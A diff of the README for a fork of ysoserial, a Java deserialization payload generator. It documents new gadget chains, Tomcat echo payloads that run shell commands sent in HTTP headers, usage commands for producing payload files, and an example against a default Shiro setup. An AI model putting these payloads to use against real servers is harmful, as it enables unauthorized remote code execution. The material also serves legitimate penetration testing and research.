@@ -17,57 +17,40 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 打包好的 jar 可以直接下载使用: [https://github.com/zema1/ysoserial/releases](https://github.com/zema1/ysoserial/releases)
 
-+ 添加 CommonsCollectionsK1 (commons-Collections <= 3.2.1 && allowTemplates)
-+ 添加 CommonsCollectionsK2 (commons-Collections == 4.0 && allowTemplates)
-+ 添加 CommonsCollectionsK3 (commons-Collections <= 3.2.1)
-+ 添加 CommonsCollectionsK4 (commons-Collections == 4.0)
-+ 添加 JDK8u20 （JDK7u21 的版本延伸 Gadget)
++ 添加 `CommonsCollectionsK1` (commons-Collections <= 3.2.1 && allowTemplates)
++ 添加 `CommonsCollectionsK2` (commons-Collections == 4.0 && allowTemplates)
++ 添加 `CommonsCollectionsK3` (commons-Collections <= 3.2.1)
++ 添加 `CommonsCollectionsK4` (commons-Collections == 4.0)
++ 添加 `Jdk8u20` （Jdk7u21 的版本延伸 Gadget)
++ 添加 全版本 Tomcat 回显 payload, 自带下列 Gadget，如有需要可以自己组合
+    + `CommonsCollectionsK1TomcatEcho`
+    + `CommonsCollectionsK2TomcatEcho`
 + 缩减了 Templates 字节码的大小，可以避免超过 tomcat header 大小等。
 
-CommonsCollections 的这4条链可以完全代替且超越原有的 CommonsCollections 的 7 条链，他们的环境依赖非常少，
-仅仅依赖 commons-collections 一个库的版本，理论上会有更好的实战兼容性，你可以完全抛弃旧的7条转而放心的使用这4条利用链。
-特别的, shiro 1.2.24 默认的环境可以使用 `CommonsCollectionsK1` 和 `CommonsCollectionsK2` 两条链来打。
+CommonsCollectionsKx 这 4 条利用链在效果上可以完全代替且超越之前的 CommonsCollection7 条链，
+他们以最小的依赖兼顾了 CC 中的各种利用链。其中 K1,K2 是一条链的两个版本，K3,K4 是一条链的两个版本。
 
-+ CommonsCollectionsK1:
-    ```
-    HashMap.readObject
-        TiedMapEntry.hashCode
-         TiedMapEntry.getValue
-           LazyMap.decorate
-             InvokerTransformer
-               templates...
-    ```
-+ CommonsCollectionsK2:
+Tomcat 回显使用时随便输入一个命令作为占位符即可，真正的命令在 http 请求 header 中指定, 规则如下:
++ Testecho: 123 将在响应 header 回显 Testecho: 123， 可以用于可靠漏洞检测
++ Testcmd: id 将执行 id 命令，并将回显写在响应 body，可以方便的用于命令执行
+```
+java -jar target/ysoserial-0.0.8-SNAPSHOT-all.jar CommonsCollectionsK1TomcatEcho a > out.bin
+```
 
-    K1 的 4.0 版, 仅改动了 lazymap 的使用使其能在 4.0 工作。
+例如：使用 CommonsCollectionsK1TomcatEcho 打 shiro 1.2.24 的默认环境
 
-+ CommonsCollectionsK3:
+![image](https://user-images.githubusercontent.com/20637881/88356652-2275ec80-cd9b-11ea-9746-8888fceb93b4.png)
 
-    CommonsCollections6 的优化版，大幅缩减了 payload 长度，效果完全一致。
-
-    ```
-    java.util.HashMap.readObject()
-        java.util.HashMap.hash()
-            TiedMapEntry.hashCode()
-                TiedMapEntry.getValue()
-                LazyMap.get()
-                    ChainedTransformer.transform()
-    ```
-
-+ CommonsCollectionsK4
-
-    K3 的 4.0 版， 仅改动了 lazymap 的使用使其能在 4.0 工作。
-
-+ Jdk8u20
-
-    手写了反序列化数据流，绕过了 Jdk7u21 后续几个版本的修复, 也是比较好用的一个 Gadget。参考: [https://github.com/pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)，
-    相比链接中的版本稳定性要好很多，而且 payload 也更小。
+最后，关于使用方法上，推荐使用 java6 来运行，因为会影响 TemplatesTmpl 最终生成的 payload, 由于 Java 向下兼容，java6 将获得最大兼容性，简易用法如下:
+```
+JAVA_HOME=/path/to/java6 java -jar target/ysoserial-0.0.8-SNAPSHOT-all.jar
+```
 
 ## 感谢
 
-我写完后发现有位师傅之前写过一个和 K1 基本一致的链，也是英雄所见略同了。 [wh1t3p1g](https://github.com/wh1t3p1g/ysoserial)
-
-另外，K3 参考了这位师傅的研究 https://xz.aliyun.com/t/7157
++ 有位师傅之前写过一个和 K1 基本一致的链，算是英雄所见略同。 [wh1t3p1g](https://github.com/wh1t3p1g/ysoserial)
++ K3 参考了这位师傅的研究 https://xz.aliyun.com/t/7157
++ Jdk8u20 是这个改进 https://github.com/pwntester/JRE8u20_RCE_Gadget 相比原版非常稳定，paylaod 也更小
 
 ## Description
 
@@ -97,50 +80,53 @@ are not responsible or liable for misuse of the software. Use responsibly.
 ## Usage
 
 ```shell
+$ java -jar target/ysoserial-0.0.8-SNAPSHOT-all.jar
 Y SO SERIAL?
 Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
   Available payload types:
-Jul 07, 2020 1:48:39 PM org.reflections.Reflections scan
-INFO: Reflections took 179 ms to scan 1 urls, producing 17 keys and 164 values
-     Payload              Authors                                Dependencies
-     -------              -------                                ------------
-     BeanShell1           @pwntester, @cschneider4711            bsh:2.0b5
-     C3P0                 @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
-     Clojure              @JackOfMostTrades                      clojure:1.8.0
-     CommonsBeanutils1    @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
-     CommonsCollections1  @frohoff                               commons-collections<=3.2.1
-     CommonsCollections2  @frohoff                               commons-collections4:4.0
-     CommonsCollections3  @frohoff                               commons-collections<=3.2.1
-     CommonsCollections4  @frohoff                               commons-collections4:4.0
-     CommonsCollections5  @matthias_kaiser, @jasinner            commons-collections<=3.2.1
-     CommonsCollections6  @matthias_kaiser                       commons-collections<=3.2.1
-     CommonsCollections7  @scristalli, @hanyrax, @EdoardoVignati commons-collections<=3.2.1
-     CommonsCollectionsK1 @koalr                                 commons-collections<=3.2.1
-     CommonsCollectionsK2 @koalr                                 commons-collections4:4.0
-     CommonsCollectionsK3 @koalr                                 commons-collections<=3.2.1
-     CommonsCollectionsK4 @koalr                                 commons-collections4:4.0
-     FileUpload1          @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
-     Groovy1              @frohoff                               groovy:2.3.9
-     Hibernate1           @mbechler
-     Hibernate2           @mbechler
-     JBossInterceptors1   @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     JRMPClient           @mbechler
-     JRMPListener         @mbechler
-     JSON1                @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
-     JavassistWeld1       @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     Jdk7u21              @frohoff
-     Jdk8u20              @pwntester, @koalr
-     Jython1              @pwntester, @cschneider4711            jython-standalone:2.5.2
-     MozillaRhino1        @matthias_kaiser                       js:1.7R2
-     MozillaRhino2        @_tint0                                js:1.7R2
-     Myfaces1             @mbechler
-     Myfaces2             @mbechler
-     ROME                 @mbechler                              rome:1.0
-     Spring1              @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
-     Spring2              @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
-     URLDNS               @gebl
-     Vaadin1              @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
-     Wicket1              @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
+Jul 24, 2020 10:48:52 AM org.reflections.Reflections scan
+INFO: Reflections took 203 ms to scan 1 urls, producing 17 keys and 172 values
+     Payload                        Authors                                Dependencies
+     -------                        -------                                ------------
+     BeanShell1                     @pwntester, @cschneider4711            bsh:2.0b5
+     C3P0                           @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
+     Clojure                        @JackOfMostTrades                      clojure:1.8.0
+     CommonsBeanutils1              @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+     CommonsCollections1            @frohoff                               commons-collections:<=3.2.1
+     CommonsCollections2            @frohoff                               commons-collections4:4.0
+     CommonsCollections3            @frohoff                               commons-collections:<=3.2.1
+     CommonsCollections4            @frohoff                               commons-collections4:4.0
+     CommonsCollections5            @matthias_kaiser, @jasinner            commons-collections:<=3.2.1
+     CommonsCollections6            @matthias_kaiser                       commons-collections:<=3.2.1
+     CommonsCollections7            @scristalli, @hanyrax, @EdoardoVignati commons-collections:<=3.2.1
+     CommonsCollectionsK1           @koalr                                 commons-collections:<=3.2.1
+     CommonsCollectionsK1TomcatEcho @koalr                                 commons-collections:<=3.2.1
+     CommonsCollectionsK2           @koalr                                 commons-collections4:4.0
+     CommonsCollectionsK2TomcatEcho @koalr                                 commons-collections4:4.0
+     CommonsCollectionsK3           @koalr                                 commons-collections:<=3.2.1
+     CommonsCollectionsK4           @koalr                                 commons-collections4:4.0
+     FileUpload1                    @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
+     Groovy1                        @frohoff                               groovy:2.3.9
+     Hibernate1                     @mbechler
+     Hibernate2                     @mbechler
+     JBossInterceptors1             @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     JRMPClient                     @mbechler
+     JRMPListener                   @mbechler
+     JSON1                          @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
+     JavassistWeld1                 @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     Jdk7u21                        @frohoff
+     Jdk8u20                        @pwntester, @koalr
+     Jython1                        @pwntester, @cschneider4711            jython-standalone:2.5.2
+     MozillaRhino1                  @matthias_kaiser                       js:1.7R2
+     MozillaRhino2                  @_tint0                                js:1.7R2
+     Myfaces1                       @mbechler
+     Myfaces2                       @mbechler
+     ROME                           @mbechler                              rome:1.0
+     Spring1                        @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
+     Spring2                        @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
+     URLDNS                         @gebl
+     Vaadin1                        @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
+     Wicket1                        @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
 ```
 
 ## Examples
